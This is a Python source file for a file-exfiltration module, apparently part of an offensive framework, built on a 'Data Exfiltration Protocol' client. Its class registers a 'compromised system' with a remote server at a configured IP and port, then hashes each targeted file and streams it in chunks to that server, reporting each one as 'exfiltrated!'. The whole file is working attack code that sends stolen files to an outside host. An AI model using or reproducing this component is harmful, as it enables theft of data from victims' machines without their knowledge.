import os
import time

from dep_client.client.Client import Client as DEPClient
from dep_client.util.Util import Util as DEPClientUtil
from dep_common.converter.Converter import Converter as DEPConverter
from dep_common.hash.Hash import Hash as HashCalc

from npdep_transfer.base.Transfer import Transfer

'''
Transfers files through the Use of Data Exfiltration Protocol (DEP)
'''
class DepFileExfiltration(Transfer):
    def __init__(self, options, registration) -> None:
        super().__init__("DepFileExfiltration", options, registration)
        self.client = DEPClient(options["ip"], options["port"], options["pkgSize"])

    def init(self):
        b_uuid = DEPConverter.uuidToBytes(self.registration.id)
        # Compromised system is registered at the server
        self.client.sendSystemInformationMessage(b_uuid)

    def send(self, container):
        b_uuid = DEPConverter.uuidToBytes(self.registration.id)
        # Check for files
        for path in container["files"]:
            # Get the file size of the file
            fileSize = os.path.getsize(path)
            # Generate sha256 hash of the file
            b_sha256 = HashCalc.getSha256Hash(path)
            # Send metadata of the file to the server
            self.client.sendDataInformationMessage(b_uuid, b_sha256, path, fileSize)
            time.sleep(.8) # This sleep is necessary to realize smooth data sending
            # From now on, the file will be read in chunks to be transfered to the server
            DEPClientUtil.sendFileWithDataContentMessage(self.client, self.options["ip"], self.options["port"], self.options["pkgSize"], path, b_uuid, b_sha256)
            print(path + " exfiltrated!")